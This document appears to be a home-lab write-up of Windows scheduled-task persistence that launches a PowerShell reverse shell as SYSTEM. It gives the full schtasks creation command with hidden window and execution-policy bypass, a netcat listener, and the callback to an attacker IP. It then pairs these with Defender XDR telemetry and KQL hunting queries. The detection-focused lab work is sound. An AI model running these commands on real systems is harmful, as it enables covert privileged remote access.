# Persistence via Scheduled Task & Reverse Shell

## Scenario Description

After gaining access to the domain-joined Windows workstation `target-PC.mylab.local`, the attacker established persistence using a Scheduled Task named `UpdateTask`.

A PowerShell reverse-shell payload was split into multiple string fragments, reconstructed through string concatenation, and written to:

```text
C:\ProgramData\update.ps1
```

The attacker then used PowerShell to create a Scheduled Task configured to execute the script at user logon under `NT AUTHORITY\SYSTEM`.

After the user logged on, the task executed the PowerShell payload and established an outbound connection to the Kali attacker machine on TCP port `4444`.

## MITRE ATT&CK Mapping

* **Tactics:** Persistence, Execution, Defense Evasion
* **T1053.005 — Scheduled Task/Job: Scheduled Task**
* **T1059.001 — Command and Scripting Interpreter: PowerShell**
* **T1027 — Obfuscated/Compressed Files and Information**

## Attack Execution

### 1. Payload Creation

The PowerShell reverse-shell payload was divided into multiple string fragments and reconstructed before being written to disk:

```text
Reverse Shell Payload
        ↓
String Fragments
        ↓
String Concatenation
        ↓
C:\ProgramData\update.ps1
```

Microsoft Defender recorded the creation of `update.ps1` by `powershell.exe`.

![PowerShell File Creation](../images/persistance/edr-sch-file-creation-cmd.png)

### 2. Scheduled Task Creation

PowerShell invoked `schtasks.exe` to create `UpdateTask`:

```powershell
schtasks.exe /create /tn "UpdateTask" /tr "powershell.exe -WindowStyle Hidden -NoP -NonI -Exec Bypass -File C:\ProgramData\update.ps1" /sc onlogon /ru "NT AUTHORITY\SYSTEM" /f
```

The process relationship was:

```text
powershell.exe
      ↓
schtasks.exe
      ↓
UpdateTask
```

![Scheduled Task Creation Command](../images/persistance/edr-sch-task-creation-cmd.png)

### 3. Scheduled Task Configuration

The task was configured as:

```text
Task Name:       UpdateTask
Trigger:         At logon
Run As:          SYSTEM
Status:          Enabled
Payload:         C:\ProgramData\update.ps1
```

The task configuration was verified using:

```powershell
schtasks /query /tn "UpdateTask" /v /fo list
```

![Scheduled Task Verification](../images/persistance/attacker-sch-task.png)

### 4. Task Execution

The task was also manually executed during testing:

```powershell
schtasks /run /tn "UpdateTask"
```

This generated additional Scheduled Task and process telemetry in Microsoft Defender.

![Scheduled Task Execution](../images/persistance/edr-sch-task-creation.png)

## Microsoft Defender Investigation

Microsoft Defender XDR identified the Scheduled Task activity and associated it with `T1053.005`.

The investigation correlated:

```text
PowerShell
    ↓
schtasks.exe
    ↓
UpdateTask
    ↓
update.ps1
    ↓
PowerShell
```

![Microsoft Defender Scheduled Task Detection](../images/persistance/sentinel-sch-task-creation.png)

### File Creation

```kql
DeviceFileEvents
| where DeviceName == "target-pc.mylab.local"
| where FileName == "update.ps1"
| project Timestamp, DeviceName, FileName, FolderPath,
          InitiatingProcessFileName, InitiatingProcessCommandLine
```

### Scheduled Task / Process Activity

```kql
DeviceProcessEvents
| where DeviceName == "target-pc.mylab.local"
| where FileName =~ "schtasks.exe"
| project Timestamp, AccountName, ProcessCommandLine,
          InitiatingProcessFileName
| order by Timestamp asc
```

### Network Connection

```kql
DeviceNetworkEvents
| where DeviceName == "target-pc.mylab.local"
| where RemotePort == 4444
| project Timestamp, DeviceName, InitiatingProcessFileName,
          RemoteIP, RemotePort
```

The network telemetry confirmed:

```text
powershell.exe
      ↓
192.168.10.133:4444
```

![EDR Network Connection](../images/persistance/edr-network-connecition.png)

## Windows Telemetry

| Source                  | Evidence                                 |
| ----------------------- | ---------------------------------------- |
| **Security Event 4698** | `UpdateTask` created                     |
| **DeviceProcessEvents** | `powershell.exe` → `schtasks.exe`        |
| **DeviceFileEvents**    | `C:\ProgramData\update.ps1` created      |
| **DeviceNetworkEvents** | `powershell.exe` → `192.168.10.133:4444` |
| **Defender XDR**        | Scheduled Task activity / `T1053.005`    |

## Attack Chain

```text
Initial Access
      ↓
PowerShell
      ↓
Reverse Shell Payload
      ↓
String Concatenation
      ↓
update.ps1 Created
      ↓
PowerShell → schtasks.exe
      ↓
UpdateTask Created
      ↓
At Logon / SYSTEM
      ↓
User Logon
      ↓
update.ps1 Executed
      ↓
192.168.10.133:4444
      ↓
SYSTEM Shell
```

## Result

The attacker successfully established persistence through `UpdateTask`, configured to execute `update.ps1` at logon as `SYSTEM`.

The activity generated correlated **process, file, scheduled-task, and network telemetry**, allowing the attack chain to be reconstructed using **Microsoft Defender XDR and KQL**.

### Successful Execution — Reverse Shell

After the Scheduled Task was created and the user logged on, `UpdateTask` executed `update.ps1` automatically.

The Kali listener was running:

```bash
nc -lvnp 4444
```

The listener received the resulting connection:

```text
192.168.10.132 → 192.168.10.133:4444
```

The resulting PowerShell session was verified as running under:

```text
NT AUTHORITY\SYSTEM
```

This confirmed that the Scheduled Task persistence mechanism successfully executed the PowerShell payload with `SYSTEM` privileges.

![Successful Reverse Shell](../images/persistance/attacker-persistance-nc.png)
